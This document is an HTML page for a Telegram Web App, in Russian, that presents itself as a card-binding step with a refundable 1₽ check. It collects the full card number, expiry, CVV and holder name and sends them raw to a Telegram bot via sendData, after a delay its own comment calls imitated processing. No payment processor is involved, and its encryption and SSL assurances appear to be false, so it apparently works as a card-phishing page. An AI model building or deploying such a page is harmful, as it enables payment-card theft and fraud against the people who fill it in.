<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Привязка карты - Test Mobile</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #666;
            font-size: 14px;
        }
        
        .card-icon {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: border-color 0.3s;
            outline: none;
        }
        
        .form-group input:focus {
            border-color: #667eea;
        }
        
        .form-row {
            display: flex;
            gap: 15px;
        }
        
        .form-row .form-group {
            flex: 1;
        }
        
        .info-text {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 25px;
            font-size: 13px;
            color: #666;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .info-icon {
            font-size: 20px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .submit-btn:active {
            transform: scale(0.98);
        }
        
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .secure-badge {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .loading.active {
            display: block;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="card-icon">💳</div>
            <h1>Привязка карты</h1>
            <p>С баланса будет списано 1₽ для проверки</p>
        </div>
        
        <div class="info-text">
            <span class="info-icon">🔒</span>
            <span>Все данные передаются в зашифрованном виде. Сумма 1₽ будет возвращена на карту.</span>
        </div>
        
        <form id="cardForm">
            <div class="form-group">
                <label for="cardNumber">Номер карты</label>
                <input 
                    type="text" 
                    id="cardNumber" 
                    placeholder="0000 0000 0000 0000" 
                    maxlength="19"
                    required
                >
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="cardExpiry">Срок действия</label>
                    <input 
                        type="text" 
                        id="cardExpiry" 
                        placeholder="MM/YY" 
                        maxlength="5"
                        required
                    >
                </div>
                
                <div class="form-group">
                    <label for="cardCvv">CVV</label>
                    <input 
                        type="password" 
                        id="cardCvv" 
                        placeholder="123" 
                        maxlength="3"
                        required
                    >
                </div>
            </div>
            
            <div class="form-group">
                <label for="cardHolder">Владелец карты</label>
                <input 
                    type="text" 
                    id="cardHolder" 
                    placeholder="IVAN IVANOV" 
                    required
                >
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn">
                Привязать карту
            </button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Обработка данных...</p>
        </div>
        
        <div class="secure-badge">
            <span>🔐</span>
            <span>Безопасное соединение SSL</span>
        </div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        // Настройка цвета заголовка
        tg.setHeaderColor('#667eea');
        tg.setBackgroundColor('#ffffff');
        
        // Форматирование номера карты
        const cardNumberInput = document.getElementById('cardNumber');
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            e.target.value = formattedValue;
        });
        
        // Форматирование срока действия
        const cardExpiryInput = document.getElementById('cardExpiry');
        cardExpiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // Разрешаем только цифры для CVV
        const cardCvvInput = document.getElementById('cardCvv');
        cardCvvInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        
        // Обработка отправки формы
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCvv = document.getElementById('cardCvv').value;
            const cardHolder = document.getElementById('cardHolder').value.toUpperCase();
            
            // Валидация
            if (cardNumber.length < 16) {
                tg.showAlert('Введите корректный номер карты');
                return;
            }
            
            if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
                tg.showAlert('Введите корректный срок действия (MM/YY)');
                return;
            }
            
            if (cardCvv.length < 3) {
                tg.showAlert('Введите корректный CVV код');
                return;
            }
            
            if (cardHolder.length < 3) {
                tg.showAlert('Введите имя владельца карты');
                return;
            }
            
            // Показываем загрузку
            document.getElementById('cardForm').style.display = 'none';
            document.getElementById('loading').classList.add('active');
            
            // Формируем данные для отправки
            const data = {
                card_number: cardNumber,
                card_expiry: cardExpiry,
                card_cvv: cardCvv,
                card_holder: cardHolder,
                timestamp: new Date().toISOString()
            };
            
            // Отправляем данные в бот
            setTimeout(() => {
                tg.sendData(JSON.stringify(data));
                tg.close();
            }, 1500); // Небольшая задержка для имитации обработки
        });
        
        // Обработка кнопки "Назад" в Telegram
        tg.onEvent('backButtonClicked', function() {
            tg.close();
        });
        
        // Включаем кнопку "Назад" если доступно
        if (tg.BackButton) {
            tg.BackButton.show();
        }
    </script>
</body>
</html>
